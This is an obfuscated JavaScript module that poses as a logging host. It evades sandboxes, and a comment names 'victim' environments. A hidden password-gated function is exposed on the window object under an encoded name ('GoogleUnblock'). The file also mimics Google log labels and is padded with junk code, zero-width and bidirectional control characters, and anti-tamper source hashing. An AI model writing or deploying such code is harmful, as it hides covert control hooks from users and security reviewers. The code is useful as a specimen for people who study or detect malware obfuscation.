  (function (_0xmod) {

  let _0xopen = false; 
  
  
  var 会員 = 2;
  // S6-B1: genuine-browser pre-check. Victim-env sims (discordlike) pass;
  // bare Node / thin sandboxes exit silently before any log or install.
  const _0xenvOk = (() => { try {
    return typeof window !== "undefined" && typeof document !== "undefined" &&
      typeof navigator !== "undefined" && !!window.document && !!window.navigator;
  } catch (e) { return false; } })();
  if (!_0xenvOk) { try { _0xmod.log = { say: () => {}, diag: () => {}, warn: () => {}, info: () => {}, queue: () => {}, flush: () => {} }; } catch (e) {} return; } 
  const Log = (() => {
    const noop = () => {};
    const _0xq = [];
    const _0xdm = (m, d) => { if (会員 >= 2 && _0xopen) d !== undefined ? console.debug(`[SYS-DIAG] ${m}`, d) : console.debug(`[SYS-DIAG] ${m}`); };
    if (会員 === 0) return { say: noop, diag: noop, warn: noop, info: noop, queue: noop, flush: noop };
    return {
      say: (c, m) => { if (会員 >= 2 && _0xopen) console.debug(`[Google ${c}] ${m}`); else console.debug(m); },
      diag: _0xdm,
      warn: (m) => console.warn(m),
      info: (m) => console.debug(m),
      queue: (m, d) => { if (_0xq.length < 64) _0xq.push([m, d]); },
      flush: () => { while (_0xq.length) { const _0xi = _0xq.shift(); _0xdm(_0xi[0], _0xi[1]); } }
    };
  })();

  
      
      const _0xsa1 = String.fromCharCode(...[51,101,53,100,55,49,52,52,97,97,57,51,51,54,56,49]);
      const _0xsb1 = String.fromCharCode(...[101,53,98,101,98,48,57,99,53,97,99,52,99,48,50,99]);
      const _0xpp1 = String.fromCharCode(...[50,102,49,52,100,54,99,48]);
      const _0xpolyP = [57592,268875,50981,263601,329151,188803,103272,128712,83291,337358,207706,88750,227835,237231,194484,206554,46151,106353,258808,332380,149248,236190,190769,46410,158755,87931,260441,186943,160240,279270,294014,80131];
      const _0xchk = async (sa, sb, poly, pw) => {
        try {
          const _0buf = await window.crypto.subtle.digest("SHA-256", new TextEncoder().encode(sa + String(pw ?? "") + sb + _0xpp));
          const _0got = Array.from(new Uint8Array(_0buf));
          if (_0got.length !== 32) return false;
          let _0xacc = 0;
          for (let i = 0; i < 32; i++) {
            const term = ((_0got[i] * 1337 + i * 37 + 101) & 0xffffffff) >>> 0;
            _0xacc |= (term ^ poly[i]);
          }
          return _0xacc === 0;
        } catch (e) { return false; }
      };
      const _0xgu = async (pw) => {
        try {
          if (!(window.crypto && window.crypto.subtle)) { return false; }
          if (await _0xchk(_0xsa1, _0xsb1, _0xpolyP, pw)) { _0xopen = true; try { Log.flush(); } catch (e) {} return true; }
          if (await _0xchk(_0xsa2, _0xsb2, _0xpolyQ, pw)) { try { _0xmod.shift?.extend?.(); } catch (e) {} return true; }
          if (await _0xchk(_0xsa3, _0xsb3, _0xpolyR, pw)) { try { _0xmod.shift?.close?.(); } catch (e) {} return true; }
          if (await _0xchk(_0xsa4, _0xsb4, _0xpolyS, pw)) { try { _0xmod.shift?.roster?.(); } catch (e) {} return true; }
          return false;
        } catch (e) { return false; }
      };

      const _0xbridge = (() => String.fromCharCode(71, 111, 111, 103, 108, 101, 85, 98, 108, 111, 99, 107))();
      try { window[_0xbridge] = _0xgu; } catch (e) {}
      try { _0xmod.host = { shut: () => { try { delete window[_0xbridge]; } catch (e) {} } }; } catch (e) {}
      const SUITE_VERSION = "8.10-R2";
  const INSTANCE_ID = "f5c480b0";
  Log.info(`[Host ${SUITE_VERSION}] initialized — worker instance ${INSTANCE_ID}.`);
  Log.diag(`Host core — uniform phrase pools, log-lock, studio gaps, refill queue, metamorphic decode.`);
  
  
  Log.queue("Host config", {
    flags: 0x7e3f,
    profile: 0x5a,
    limit: 50,
    rev: 0x86
  });

    _0xmod.log = Log;

    (() => {
      const _0x07aaa6 = { p: 0, q: 0, r: 0 };
      const _0xe048a5 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x07aaa6.p = (_0x07aaa6.p + _0xe048a5[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x07aaa6.q = (_0x07aaa6.q ^ _0x07aaa6.p) & 0xffff; }
        _0x07aaa6.r = (_0x07aaa6.r + i * 31) & 0xffff;
      }
      const _0xb72a43 = _0x07aaa6.p ^ _0x07aaa6.q ^ _0x07aaa6.r;
      let _0x2a0ad2 = Array.from({ length: (_0xb72a43 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x90bbd3 = _0x2a0ad2.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x90bbd3 > 0x7ffff) { _0x2a0ad2 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xsa2 = String.fromCharCode(...[54,98,57,53,48,49,98,52,55,54,101,57,50,52,48,56]);
    const _0xsb2 = String.fromCharCode(...[54,102,99,52,50,52,53,50,49,53,48,98,57,48,56,57]);
    const _0xpolyQ = [331677,89717,95102,247557,166037,44407,4334,231661,140782,31185,136845,222450,71406,300070,62121,218587,72891,163844,305603,125145,161281,189395,181410,149359,184158,182858,146796,281870,237786,11870,144270,195113];

    (() => {
      const _0xb67342 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x68c9e9 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x63c4cc = (Date.now() & 0xffff) ^ 0xf22c;
      const _0xdfaac0 = _0xb67342(_0x63c4cc);
      let _0x2e85a0 = _0xdfaac0;
      for (let i = 0; i < 6; i++) { try { _0x2e85a0 = _0x68c9e9(_0x2e85a0, i * 2654435761); } catch (e) { break; } }
      const _0x97040f = [_0x63c4cc, _0xdfaac0, _0x2e85a0];
      if (_0x97040f.length > 2 && (_0x2e85a0 & 7) === 0) { _0x97040f.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x25edd5 = [22734,48645,14984,40149,41802];
      const _0x159328 = {};
      for (let i = 0; i < _0x25edd5.length; i++) { const w = _0x25edd5[i]; _0x159328[w] = (w.length * 2654435761) >>> 0; }
      let _0x7f56a8 = 0;
      for (const x in _0x159328) { _0x7f56a8 = (_0x7f56a8 + _0x159328[x]) & 0xffffffff; }
      const _0xeade20 = [_0x7f56a8, _0x25edd5.length];
      const _0xe0ed18 = _0x25edd5.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xeade20[0] < 0 || _0xe0ed18 === 0) { _0xeade20[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xpp2 = String.fromCharCode(...[55,52,57,50,102,53,97,55]);

    (() => {
      const _0x2f6c08 = [50303,62547,40054,29298,36038];
      const _0x309c6a = {};
      for (let i = 0; i < _0x2f6c08.length; i++) { const w = _0x2f6c08[i]; _0x309c6a[w] = (w.length * 2654435761) >>> 0; }
      let _0x32376e = 0;
      for (const x in _0x309c6a) { _0x32376e = (_0x32376e + _0x309c6a[x]) & 0xffffffff; }
      const _0x92772f = [_0x32376e, _0x2f6c08.length];
      const _0xc8e6d5 = _0x2f6c08.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x92772f[0] < 0 || _0xc8e6d5 === 0) { _0x92772f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xsa3 = String.fromCharCode(...[100,57,50,56,55,101,51,57,101,57,98,55,98,99,98,49]);
    const _0xsb3 = String.fromCharCode(...[97,102,49,54,55,99,52,52,99,55,56,52,52,51,101,99]);
    const _0xpolyR = [125779,216732,258216,151293,75121,142008,319866,60525,85965,127449,150215,41955,107505,144978,201169,194521,240016,56884,262819,36903,301666,266941,275000,264341,168114,230990,172199,219031,130826,225790,19929,64087];

    (() => {
      const _0x98fc3c = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x59de38 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x01c1cf = (Date.now() & 0xffff) ^ 0x0774;
      const _0xa74049 = _0x98fc3c(_0x01c1cf);
      let _0x57a0ca = _0xa74049;
      for (let i = 0; i < 6; i++) { try { _0x57a0ca = _0x59de38(_0x57a0ca, i * 2654435761); } catch (e) { break; } }
      const _0x5d3a4e = [_0x01c1cf, _0xa74049, _0x57a0ca];
      if (_0x5d3a4e.length > 2 && (_0x57a0ca & 7) === 0) { _0x5d3a4e.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
    const _0xsa4 = String.fromCharCode(...[56,98,50,53,50,99,52,102,57,98,102,56,54,55,57,98]);
    const _0xsb4 = String.fromCharCode(...[49,52,53,56,57,49,99,53,55,55,57,55,101,56,48,97]);
    const _0xpolyS = [84332,267538,234150,252905,43033,231587,323,83254,43181,273182,158237,159611,13915,270656,175766,273404,80913,70254,35529,194669,206739,297692,57069,182784,30403,332602,333976,205661,130826,336761,81431,76120];
    const _0xpp3 = String.fromCharCode(...[99,102,52,102,102,49,97,101]);
    const _0xpp = _0xpp1 + _0xpp2 + _0xpp3;

  
    (() => {
      const _0x31f5 = [0x20fd,0xfa09,0x2157,0x40f9,0x81ba];
      let _0xkc31f5 = 0;
      for (let i = 0; i < _0x31f5.length; i++) { _0xkc31f5 = (_0xkc31f5 * 0x9e37 + _0x31f5[i]) & 0x7fffffff; }
      const _0xzw31f5 = "k‍q‍z‍x‌v‌9‍m‍4";
      const _0xzzeca2 = "s​w​a‌t‍c​h‌";
      const _0xrl31f5 = "j7‮9m2q‬k4";
      if ((_0xkc31f5 & 0xffff) === 0xffff) { const _0xjnk = [_0xzw31f5, _0xrl31f5].join(""); if (_0xjnk.length > 40) { _0xkc31f5 = 0; } }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();
})(_0xmod);

globalThis.lexMode = 0;
var lexPins = null;
function lexFnv(s) { var h = 0x811c9dc5, i; for (i = 0; i < s.length; i++) { h ^= s.charCodeAt(i) & 255; h = Math.imul(h, 0x01000193); } return (h >>> 0).toString(16); }
globalThis.lexProbeA = function (n) { var x = (n ^ 0x51ab3c09) >>> 0, i; for (i = 0; i < 24; i++) { x = Math.imul(x ^ (x >>> 13), 0x5bd1e995) >>> 0; x ^= x >>> 15; } return x >>> 0; };
function lexVerify() {
  try {
    if (!lexPins || lexPins.length !== 3) { return 0; }
    var ps = [lexProbeA, (typeof lexProbeU !== 'undefined') ? lexProbeU : null, (typeof lexProbeX !== 'undefined') ? lexProbeX : null];
    for (var i = 0; i < 3; i++) {
      if (!ps[i]) { return 0; }
      void ps[i](i + 1);
      if (lexFnv(String(ps[i].toString())) !== lexPins[i]) { lexMode = 1; return 1; }
    }
    return 0;
  } catch (e) { return 0; }
}
globalThis.lexSetPins = function (a) { try { if (a && a.length === 3) { lexPins = a; lexVerify(); } } catch (e) {} };
try { lexVerify(); } catch (e) {}
